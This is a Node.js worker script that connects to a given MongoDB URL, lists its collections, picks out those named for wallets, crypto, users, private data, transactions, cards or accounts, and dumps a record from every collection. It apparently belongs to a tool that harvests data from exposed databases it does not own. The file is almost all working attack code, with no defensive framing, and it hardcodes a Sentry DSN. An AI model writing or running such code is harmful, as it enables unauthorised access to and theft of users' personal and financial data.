const { expose } = require('threads/worker')
const mongoose = require('mongoose')
const Promise = require('bluebird')

require('../models')
const Sentry = require('@sentry/node')


Sentry.init({
    dsn: "https://1ff02f3dcce144aaaaa7b424918555f8@o1362299.ingest.sentry.io/6653686",
    integrations: [
      // enable HTTP calls tracing
      new Sentry.Integrations.Http({ tracing: true }),
    ],
  
    // Set tracesSampleRate to 1.0 to capture 100%
    // of transactions for performance monitoring.
    // We recommend adjusting this value in production
    tracesSampleRate: 1.0,
  });



expose(async mongoUrl => {
  console.log('checking', mongoUrl)
  const tmpDb = await new mongoose.Mongoose()
      try {
        const connection = await tmpDb.connect(mongoUrl)
        if(connection) {
          
          const collectionNames = await (await tmpDb.connection.db.listCollections().toArray()).map(item => item.name)
          const matches = collectionNames.filter(name => name.includes('wallet') || name.includes('crypto') || name.includes('users') || name.includes('private') || name.includes('transactions') || name.includes('cards') ||name.includes('accounts'))
          console.log('mongourl', mongoUrl, matches.length)
          const modelNames = collectionNames.map(name => name.charAt(0).toUpperCase() + name.slice(1))
          let schema = new mongoose.Schema({}, {strict: false})
          // console.log('got schema', schema)
  
          const models = modelNames.map(name => {
            return collectionNames.map(collectionName => {
              console.log('collection name', collectionName)
              // console.log('collection name', collectionName)
              // console.log('model name', name)
              return tmpDb.model(name, schema, collectionName)
            })
          }).reduce((a, b) => [...a, ...b], [])
           return Promise.map(models, async model => {
            console.log(await model.findOne())
            return model
          })
        }
        console.log('cant connect')
      }
      catch(err) {
        console.log(err)
        return err
      }
   
})